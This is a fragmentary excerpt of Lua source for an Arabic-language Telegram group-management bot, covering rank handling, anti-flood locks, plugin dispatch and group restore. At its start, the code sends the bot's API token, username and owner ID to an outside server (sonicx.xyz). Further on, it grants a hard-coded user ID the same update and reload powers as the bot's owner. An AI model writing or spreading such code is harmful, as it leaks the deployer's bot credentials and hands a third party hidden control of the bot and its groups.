...
https.request('https://sonicx.xyz/Mic/Susj.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
Cr_file = io.open("./inc/Token.txt", "w")
Cr_file:write(Token)
Cr_file:close()
print('\27[1;36m￤Token.txt is created.\27[m')
local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس معاذ \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
...
hassan = Token:match("(%d+)")
our_id = tonumber(hassan)
Apihassan = redis:get(hassan..":ApiSource")
ApiToken = "https://api.telegram.org/bot"..Token
Bot_User = redis:get(hassan..":UserNameBot:")
SUDO_ID = tonumber(redis:get(hassan..":SUDO_ID:"))
if not SUDO_ID then io.popen("rm -fr ./inc/Token.txt") end
SUDO_USER = redis:hgetall(hassan..'username:'..SUDO_ID).username
version = redis:get(hassan..":VERSION")
DataCenter = redis:get(hassan..":DataCenter:")
...
..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..hassan..')\027[0;32m\n'
...
if msg.type == "pv" and redis:get(hassan..':mute_pv:'..msg.sender_user_id_) then
print('\27[1;31m is_MUTE_BY_FLOOD\27[0m')
return false 
end
if msg.type ~= "pv" and redis:get(hassan..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood') then
print("\27[1;31mThis Flood Sender ...\27[0")
Del_msg(msg.chat_id_,msg.id_)
return false
end
if redis:get(hassan..'group:add'..msg.chat_id_) then 
...
and redis:get(hassan.."lock_cleaner"..msg.chat_id_) then
print("Clener >>> ")
redis:sadd(hassan..":IdsMsgsCleaner:"..msg.chat_id_,msg.id_)
Timerr = redis:get(hassan..':Timer_Cleaner:'..msg.chat_id_)
if Timerr then 
Timerr = tonumber(Timerr)
Timerr = 60*60*Timerr
end
redis:setex(hassan..":SetTimerCleaner:"..msg.chat_id_..msg.id_,Timerr or 21600,true)  
end



print(hassan..":IdsMsgsCleaner:"..msg.chat_id_)
local Cleaner = redis:smembers(hassan..":IdsMsgsCleaner:"..msg.chat_id_)
for k,v in pairs(Cleaner) do
if not redis:get(hassan..":SetTimerCleaner:"..msg.chat_id_..v) then
Del_msg(msg.chat_id_,v)
redis:srem(hassan..":IdsMsgsCleaner:"..msg.chat_id_,v)
...
if msg.GroupActive and redis:get(hassan..'mute_tgservice'..msg.chat_id_) then
Del_msg(msg.chat_id_,msg.id_)
end
return false 
end 
...
msg.TheRankCmd = redis:get(hassan..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
msg.TheRank = redis:get(hassan..":RtbaNew1:"..msg.chat_id_) or 'مطور اساسي 👨🏻‍✈️' 
msg.Rank = 1
elseif redis:sismember(hassan..':SUDO_BOT:',msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(hassan..":RtbaNew2:"..msg.chat_id_) or 'المطور'
msg.TheRank = redis:get(hassan..":RtbaNew2:"..msg.chat_id_) or 'مطور البوت 👨🏽‍💻'
msg.Rank = 2
elseif msg.GroupActive and redis:sismember(hassan..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(hassan..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي'
msg.TheRank = redis:get(hassan..":RtbaNew3:"..msg.chat_id_) or 'منشئ اساسي 👲🏼'
msg.Rank = 11
elseif msg.GroupActive and redis:sismember(hassan..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(hassan..":RtbaNew4:"..msg.chat_id_) or 'المنشىء'
msg.TheRank = redis:get(hassan..":RtbaNew4:"..msg.chat_id_) or 'المنشىء 👷🏽'
msg.Rank = 3
elseif msg.GroupActive and redis:sismember(hassan..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(hassan..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
msg.TheRank = redis:get(hassan..":RtbaNew5:"..msg.chat_id_) or 'مدير البوت 👨🏼‍⚕️' 
msg.Rank = 4
elseif msg.GroupActive and redis:sismember(hassan..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRankCmd = redis:get(hassan..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
msg.TheRank = redis:get(hassan..":RtbaNew6:"..msg.chat_id_) or 'ادمن في البوت 👨🏼‍🎓'
msg.Rank = 5
elseif msg.GroupActive and redis:sismember(hassan..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
msg.TheRank = redis:get(hassan..":RtbaNew7:"..msg.chat_id_) or 'عضو مميز'
msg.Rank = 6
...
local lock_bots = redis:get(hassan..'lock_bots'..msg.chat_id_)
ZISBOT = false
...
if msg.GroupActive and ZISBOT and redis:get(hassan..'lock_bots_by_kick'..msg.chat_id_) then
...
if not msg.Special and not msg.Admin and redis:get(hassan.."lock_Add"..msg.chat_id_) then
...
if redis:get(hassan.."lock_check"..msg.chat_id_) and not redis:get(hassan..":TqeedUser:"..msg.chat_id_..Senderid) then
...
if msg.Special or msg.Admin then redis:srem(hassan..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
...
if msg.Special then redis:srem(hassan..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
...
if redis:get(hassan..'mute_text'..msg.chat_id_) then --قفل الدردشه
...
if ScriptFile and ScriptFile.hassan then 
if msg.text and ScriptFile.ihassan then
Xhassan = ScriptFile.hassan
local list = redis:hgetall(hassan..":AwamerBotArray:"..msg.chat_id_)
for hassan2,k in pairs(list) do
Text = msg.text
Text2 = k
if Text:match(hassan2) then 
local amrr = {Text:match(hassan2)}
local AmrOld = redis:hgetall(hassan..":AwamerBotArray2:"..msg.chat_id_)
amrnew = "" amrold = ""
...
GetMsg = ScriptFile.ihassan(msg,{Text:match(Text2)})
if GetMsg then
...
Text = Text:gsub("ک","ك")
Text = Text:gsub("ه‍","ه")
if Text:match(hassan) then -- Check Commands To admin
GetMsg = ScriptFile.ihassan(msg,{Text:match(hassan)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",hassan.." | Plugin is: \27[1;32mScript.lua\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
return false
end 
end
...
if ScriptFile.dhassan then
if ScriptFile.dhassan(msg) == false then
return false
end
...
if Plug.hassan then 
if msg.text and Plug.ihassan then
for k, hassan in pairs(Plug.hassan) do
if msg.text:match(hassan) then
local GetMsg = Plug.ihassan(msg,{msg.text:match(hassan)})
if GetMsg then
print("\27[1;35m¦This_Msg : ",hassan.." | Plugin is: \27[1;32m"..name.."\27[0m")
sendMsg(msg.chat_id_,msg.id_,GetMsg)
end 
return false
end
...
redis:srem(hassan..'users',msg.sender_user_id_)
end
...
if redis:get(hassan..":propin"..msg.chat_id_) == msg.content_.text_ then
redis:del(hassan..":propin"..msg.chat_id_)
...
if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1847232332 or msg.sender_user_id_ == 1847232332) then
return sendMsg(msg.chat_id_,msg.id_,"🗂¦ تم تحديث الملفات",function(arg,data)
Refresh_Start = true
end)
end 
if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1847232332 or msg.sender_user_id_ == 1847232332) then
UpdateSource(msg)
...
if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1847232332 or msg.sender_user_id_ == 1847232332) then
...
if redis:get(hassan..'group:add'..data.chat_.id_) then
redis:set(hassan..'group:name'..data.chat_.id_,data.chat_.title_)
end
elseif data.ID == "UpdateChannel" then  
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
if redis:get(hassan..'group:add-100'..data.channel_.id_) then
local linkGroup = (redis:get(hassan..'linkGroup-100'..data.channel_.id_) or "")
local NameGroup = (redis:get(hassan..'group:name-100'..data.channel_.id_) or "")
...
redis:mset(
hassan..'group:name'..k,IDS.Title,
hassan..'num_msg_max'..k,5,
hassan..'group:add'..k,true,
hassan..'lock_link'..k,true,
hassan..'lock_spam'..k,true,
hassan..'lock_webpage'..k,true,
hassan..'lock_markdown'..k,true,
hassan..'lock_flood'..k,true,
hassan..'lock_bots'..k,true,
hassan..'mute_forward'..k,true,
hassan..'mute_contact'..k,true,
hassan..'mute_document'..k,true,
hassan..'mute_inline'..k,true,
hassan..'lock_username'..k,true,
hassan..'replay'..k,true
)
redis:sadd(hassan..'group:ids',k) 

if IDS.Admins then
for user,ID in pairs(IDS.Admins) do
redis:hset(hassan..'username:'..ID,'username',user)
redis:sadd(hassan..'admins:'..k,ID)
end
end
if IDS.Creator then
for user,ID in pairs(IDS.Creator) do
redis:hset(hassan..'username:'..ID,'username',user)
redis:sadd(hassan..':MONSHA_BOT:'..k,ID)
end
end
if IDS.Owner then
for user,ID in pairs(IDS.Owner) do
redis:hset(hassan..'username:'..ID,'username',user)
redis:sadd(hassan..'owners:'..k,ID)
end
end
end
io.popen("rm -fr ../.telegram-cli/data/document/*")
sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'• تم رفع آلنسـخهہ آلآحتيآطـيهہ\n⚖️*¦ حآليآ عدد مـجمـوعآتك هي *'..redis:scard(hassan..'group:ids')..'* 🌿\n✓')
end
elseif data.ID == "UpdateUser" then  
if data.user_.type_.ID == "UserTypeDeleted" then
print("¦ userTypeDeleted")
redis:srem(hassan..'users',data.user_.id_)
elseif data.user_.type_.ID == "UserTypeGeneral" then
local CheckUser = redis:hgetall(hassan..'username:'..data.user_.id_).username
...
redis:hset(hassan..'username:'..data.user_.id_,'username',USERNAME)
end 
end
